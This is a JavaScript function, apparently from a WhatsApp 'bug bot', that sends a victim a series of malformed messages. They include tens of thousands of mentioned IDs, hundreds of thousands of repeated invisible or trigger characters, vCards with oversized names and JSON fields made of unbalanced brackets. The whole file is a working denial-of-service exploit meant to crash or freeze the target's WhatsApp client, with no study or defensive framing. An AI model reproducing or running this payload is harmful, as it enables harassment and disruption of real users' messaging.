
async function crashinvis(target, sock) {
  try {
    const mentionedMetaAi = [
      "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
      "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net",
      "13135550005@s.whatsapp.net", "13135550006@s.whatsapp.net",
      "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
      "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net"
    ];
    const metaSpam = Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
    const textSpam = "᬴".repeat(250000);
    const mentionSpam = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const invisibleChar = '\u2063'.repeat(500000) + "@0".repeat(50000);
    const contactName = "🩸⃟ ༚ Rezzz⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣";
    const triggerChar = "𑇂𑆵𑆴𑆿".repeat(60000);
    const contactAmount = 200;
    const corruptedJson = "{".repeat(500000);
    const mention40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mention16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const randomMentions = Array.from({ length: 10 }, () => "0@s.whatsapp.net");

    await sock.relayMessage(target, {
      orderMessage: {
        orderId: "1228296005631191",
        thumbnail: { url: "https://files.catbox.moe/ykvioj.jpg" },
        itemCount: 9999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: `${'ꦾ'.repeat(60000)}`,
        orderTitle: "🩸⃟ ༚ Rezzz⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
        sellerJid: "5521992999999@s.whatsapp.net",
        token: "Ad/leFmSZ2bEez5oa0i8hasyGqCqqo245Pqu8XY6oaPQRw==",
        totalAmount1000: "9999999999",
        totalCurrencyCode: "USD",
        messageVersion: 2,
        viewOnce: true,
        contextInfo: {
          mentionedJid: [target, ...mentionedMetaAi, ...metaSpam],
          externalAdReply: {
            title: "ꦾ".repeat(20000),
            mediaType: 2,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            containsAutoReply: true,
            body: "©rezgacor",
            thumbnail: { url: "https://files.catbox.moe/kst7w4.jpg" },
            sourceUrl: "about:blank",
            sourceId: client.generateMessageTag(),
            ctwaClid: "ctwaClid",
            ref: "ref",
            clickToWhatsappCall: true,
            ctaPayload: "ctaPayload",
            disableNudge: false,
            originalimgLink: "about:blank"
          },
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: 0,
              durationSecs: "9999",
              callType: "VIDEO",
              participants: [{ jid: target, callOutcome: 1 }]
            }
          }
        }
      }
    }, {});

    await sock.sendMessage(target, {
      text: textSpam,
      contextInfo: { mentionedJid: mentionSpam }
    }, { quoted: null });

    await sock.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 9999,
                degreesLongitude: 9999
              },
              hasMediaAttachment: true
            },
            body: { text: invisibleChar },
            nativeFlowMessage: {},
            contextInfo: { mentionedJid: randomMentions }
          },
          groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: randomMentions,
            contextInfo: { mentionedJid: randomMentions }
          }
        }
      }
    }, {
      participant: { jid: target },
      messageId: undefined
    });

    const contacts = Array.from({ length: contactAmount }, () => ({
      displayName: `${contactName + triggerChar}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${contactName};;;\nFN:${contactName}\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
    }));

    await sock.relayMessage(target, {
      contactsArrayMessage: {
        displayName: `${contactName + triggerChar}`,
        contacts,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          quotedAd: {
            advertiserName: "x",
            mediaType: "IMAGE",
            jpegThumbnail: "" 
          }
        }
      }
    }, {});

    const payloadDelay1 = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: "",
            fileLength: "9999999999999",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            height: 1,
            width: 1,
            jpegThumbnail: Buffer.from("").toString("base64"),
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ▾𝗣𝗛𝗢𝗘𝗡𝗜𝗫 •𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦⟅ ༑ ▾" },
            footer: { text: "🩸 ༑ 𝗣𝗛𝗢𝗘𝗡𝗜𝗫 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸" },
            nativeFlowMessage: { messageParamsJson: corruptedJson },
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", payloadDelay1, {
      messageId: null,
      statusJidList: [target]
    });

    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=...",
                mimetype: "image/jpeg",
                caption: "{ null ) } Sigma \u0000 Bokep 100030 caption: bokep",
                height: 819,
                width: 1792,
                jpegThumbnail: Buffer.from("").toString("base64"),
                mediaKey: "WedxqVzBgUBbL09L7VUT52ILfzMdRnJsjUPL0OuLUmQ=",
                mediaKeyTimestamp: "1752001602"
              },
              hasMediaAttachment: true
            },
            body: { text: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣" },
            nativeFlowMessage: {
              buttons: [
                { name: "galaxy_message", buttonParamsJson: "[".repeat(29999) },
                { name: "galaxy_message", buttonParamsJson: "{".repeat(38888) }
              ],
              messageParamsJson: "{".repeat(10000)
            },
            contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" }
          }
        }
      }
    }, {});

    console.log("Succes Send to target!");

  } catch (err) {
    console.error("❌ Error in function bug axgankBug:", err);
  }
}